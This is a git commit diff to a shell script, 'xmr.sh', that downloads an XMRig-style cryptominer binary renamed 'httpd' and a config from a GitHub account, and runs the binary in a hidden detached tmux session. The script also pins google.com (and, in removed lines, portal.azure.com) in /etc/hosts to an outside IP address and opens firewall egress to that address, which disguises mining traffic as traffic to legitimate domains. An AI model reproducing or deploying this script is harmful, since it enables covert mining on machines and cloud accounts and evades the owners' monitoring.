b296f43f03f6e57407f21c7a2562adaebadff996
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2020-09-14 14:40:02 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,12 +1,28 @@
 #!/bin/bash
 
+set -x #echo on
+if [ -f ${PWD}/httpd ]; then
+    if pgrep -x "httpd" > /dev/null
+then
+    echo "scrip dang chay roi , ke cmn di "
+    
+else
 
-sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
-sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
+echo "script da install , chay thoi "
 sudo rm config.json
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
-sudo chmod +x azu
-sudo -- sh -c "echo '103.145.255.41  portal.azure.com' >> /etc/hosts"
+sudo tmux new-session -d -s my_session1  './httpd'
+
+fi
+exit
+fi
+
+
+
+sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux -y
+sudo rm config.json
+sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
+sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
@@ -14,6 +30,7 @@ sudo bash randomx_boost.sh
 sudo chmod +x httpd
 sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
 sudo tmux new-session -d -s my_session1  './httpd'
+
 sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
 sudo iptables -I OUTPUT 2 -p tcp -d google.com -j ACCEPT
 sudo iptables -I OUTPUT 3 -p tcp -d 103.145.255.41 -j ACCEPT
